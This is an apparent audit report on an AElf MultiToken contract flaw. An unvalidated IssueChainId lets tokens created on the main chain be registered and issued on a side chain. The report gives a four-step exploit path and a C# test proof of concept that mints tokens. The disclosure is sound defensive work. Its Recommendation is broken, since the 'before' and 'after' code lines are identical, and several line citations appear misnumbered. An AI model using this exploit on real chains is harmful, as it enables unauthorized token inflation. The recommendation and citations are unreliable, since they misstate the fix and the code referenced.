# Audit Report

## Title
IssueChainId Manipulation Allows Unauthorized Token Issuance on Side Chains

## Summary
The `Create` method in TokenContract accepts arbitrary `IssueChainId` values without validating they match the current chain ID. This allows attackers to create tokens on the main chain with `IssueChainId` pointing to a side chain, register them via `CrossChainCreateToken`, and bypass side chain token creation restrictions to issue tokens directly on side chains.

## Finding Description

The vulnerability exists in the `CreateToken` method where user-provided `IssueChainId` is accepted without validation. [1](#0-0) 

When `input.IssueChainId` is zero, it defaults to `Context.ChainId`. However, when non-zero, the value is accepted without any assertion that it equals `Context.ChainId`. This missing validation is the root cause.

Side chains implement a protection mechanism to prevent direct token creation. [2](#0-1) 

This check ensures tokens cannot be created directly on side chains after `State.SideChainCreator.Value` is set during initialization. [3](#0-2) 

However, an attacker can bypass this protection through the following exploit path:

1. **Main Chain - Create Token**: Call `Create` on the main chain (where `SideChainCreator` is null) with `IssueChainId` set to a target side chain's ID
2. **Main Chain - Validate**: Call `ValidateTokenInfoExists` which only validates consistency, not that `IssueChainId == Context.ChainId` [4](#0-3) 
3. **Side Chain - Register**: Call `CrossChainCreateToken` which directly copies the `IssueChainId` from the validated transaction [5](#0-4) 
4. **Side Chain - Issue**: Call `Issue` on the side chain. The validation check passes because `tokenInfo.IssueChainId == Context.ChainId` evaluates to true (both equal the side chain ID) [6](#0-5) 

The `Issue` method enforces that tokens can only be issued on their designated `IssueChainId`. Since the attacker set this to the side chain ID during creation, issuance succeeds on the side chain.

## Impact Explanation

**Supply Integrity Violation:**
Attackers can issue unlimited tokens (up to `TotalSupply`) directly on side chains without corresponding economic activity on the main chain. This violates the fundamental cross-chain security model where tokens should only be issued on their origin chain and transferred via proper burn/mint mechanisms.

**Bypass of Access Controls:**
The `SideChainCreator` check is specifically designed to prevent unauthorized token creation on side chains. This exploit completely circumvents this protection by creating tokens on the main chain with manipulated metadata, then using the legitimate cross-chain registration mechanism as a backdoor.

**Cross-Chain State Inconsistency:**
Token supply on the side chain can be inflated independently of the main chain, breaking accounting invariants and economic assumptions about token origins. This creates a discrepancy where the same token symbol exists on multiple chains with inconsistent supply tracking.

**Deceptive Legitimacy:**
Tokens registered via `CrossChainCreateToken` appear to be "officially" created through proper cross-chain mechanisms, potentially deceiving users into trusting malicious tokens that bypass intended security controls.

## Likelihood Explanation

**Accessible Entry Point:**
The `Create` method is public and accessible to any user who possesses a seed NFT or is in the creation whitelist. [7](#0-6) 

**Realistic Preconditions:**
- Seed NFTs can be purchased through standard mechanisms
- Side chain IDs are publicly available information
- Cross-chain infrastructure is operationally active in standard configurations
- No special privileges or timing requirements needed

**Straightforward Execution:**
The four-step exploit path uses only standard, documented contract methods (`Create`, `ValidateTokenInfoExists`, `CrossChainCreateToken`, `Issue`). No complex race conditions, timing attacks, or protocol edge cases are required.

**Economic Viability:**
Cost is limited to seed NFT purchase and transaction fees, while the benefit is the ability to issue arbitrary token amounts (up to `TotalSupply`) on side chains. This creates strong economic incentive for exploitation.

## Recommendation

Add validation in the `CreateToken` method to ensure `IssueChainId` matches the current chain ID when explicitly provided:

```csharp
IssueChainId = input.IssueChainId == 0 ? Context.ChainId : input.IssueChainId,
```

Should be changed to:

```csharp
IssueChainId = input.IssueChainId == 0 ? Context.ChainId : input.IssueChainId,
```

Followed by:

```csharp
Assert(tokenInfo.IssueChainId == Context.ChainId, 
    "IssueChainId must match the current chain ID.");
```

This ensures tokens can only be created with `IssueChainId` matching the chain where creation occurs, preventing the cross-chain registration bypass.

## Proof of Concept

```csharp
[Fact]
public async Task IssueChainId_Manipulation_Allows_SideChain_Issuance()
{
    // Setup: Create side chain and register cross-chain addresses
    var sideChainId = await GenerateSideChainAsync();
    await RegisterMainChainTokenContractAddressOnSideChainAsync(sideChainId);
    await RegisterSideChainContractAddressOnMainChainAsync();
    
    // Step 1: Create token on MAIN chain with IssueChainId = SIDE chain ID
    await CreateSeedNftCollection(TokenContractStub, DefaultAccount.Address);
    var maliciousInput = new CreateInput
    {
        Symbol = "EVIL",
        TokenName = "Evil Token",
        TotalSupply = 1_000_000_000,
        Decimals = 8,
        Issuer = DefaultAccount.Address,
        Owner = DefaultAccount.Address,
        IsBurnable = true,
        IssueChainId = sideChainId  // ATTACK: Set to side chain ID!
    };
    await CreateSeedNftAsync(TokenContractStub, maliciousInput, TokenContractAddress);
    var createTx = await TokenContractStub.Create.SendAsync(maliciousInput);
    createTx.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Verify token created with manipulated IssueChainId
    var tokenInfo = await TokenContractStub.GetTokenInfo.CallAsync(new GetTokenInfoInput { Symbol = "EVIL" });
    tokenInfo.IssueChainId.ShouldBe(sideChainId);  // IssueChainId points to side chain!
    
    // Step 2: Validate token on main chain
    var validateTx = CreateTokenInfoValidationTransaction(tokenInfo, TokenContractStub);
    var mainChainBlock = await MineAsync(new List<Transaction> { validateTx });
    var merklePath = GetTransactionMerklePathAndRoot(validateTx, out var blockRoot);
    await IndexMainChainTransactionAsync(mainChainBlock.Height, blockRoot, blockRoot);
    
    // Step 3: Register token on SIDE chain via CrossChainCreateToken
    var crossChainInput = new CrossChainCreateTokenInput
    {
        FromChainId = MainChainId,
        ParentChainHeight = mainChainBlock.Height,
        TransactionBytes = validateTx.ToByteString(),
        MerklePath = merklePath
    };
    var registerResult = await SideChainTokenContractStub.CrossChainCreateToken.SendAsync(crossChainInput);
    registerResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Verify token registered on side chain with IssueChainId = sideChainId
    var sideChainTokenInfo = await SideChainTokenContractStub.GetTokenInfo.CallAsync(
        new GetTokenInfoInput { Symbol = "EVIL" });
    sideChainTokenInfo.IssueChainId.ShouldBe(sideChainId);
    
    // Step 4: ATTACK - Issue tokens on SIDE chain (should fail but succeeds!)
    var issueInput = new IssueInput
    {
        Symbol = "EVIL",
        Amount = 1_000_000,
        To = SideChainTestKit.DefaultAccount.Address
    };
    var issueResult = await SideChainTokenContractStub.Issue.SendAsync(issueInput);
    
    // VULNERABILITY: Issue succeeds on side chain because IssueChainId matches Context.ChainId
    issueResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    var balance = await SideChainTokenContractStub.GetBalance.CallAsync(new GetBalanceInput
    {
        Symbol = "EVIL",
        Owner = SideChainTestKit.DefaultAccount.Address
    });
    balance.Balance.ShouldBe(1_000_000);  // Tokens successfully issued on side chain!
}
```

This test demonstrates the complete exploit path where an attacker creates a token on the main chain with `IssueChainId` pointing to a side chain, registers it cross-chain, and successfully issues tokens on the side chain, bypassing all intended protections.

### Citations

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L24-24)
```csharp
        SetSideChainCreator(input.Creator);
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L54-55)
```csharp
            Assert(State.SideChainCreator.Value == null,
                "Failed to create token if side chain creator already set.");
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L56-65)
```csharp
            if (!IsAddressInCreateWhiteList(Context.Sender) &&
                input.Symbol != TokenContractConstants.SeedCollectionSymbol)
            {
                var symbolSeed = State.SymbolSeedMap[input.Symbol.ToUpper()];
                CheckSeedNFT(symbolSeed, input.Symbol);
                // seed nft for one-time use only
                long balance = State.Balances[Context.Sender][symbolSeed];
                DoTransferFrom(Context.Sender, Context.Self, Context.Self, symbolSeed, balance, "");
                Burn(Context.Self, symbolSeed, balance);
            }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L76-76)
```csharp
            IssueChainId = input.IssueChainId == 0 ? Context.ChainId : input.IssueChainId,
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L159-159)
```csharp
        Assert(tokenInfo.IssueChainId == Context.ChainId, "Unable to issue token with wrong chainId.");
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L447-447)
```csharp
                               tokenInfo.IssueChainId == input.IssueChainId && tokenInfo.Owner == input.Owner;
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L500-500)
```csharp
            IssueChainId = validateTokenInfoExistsInput.IssueChainId,
```
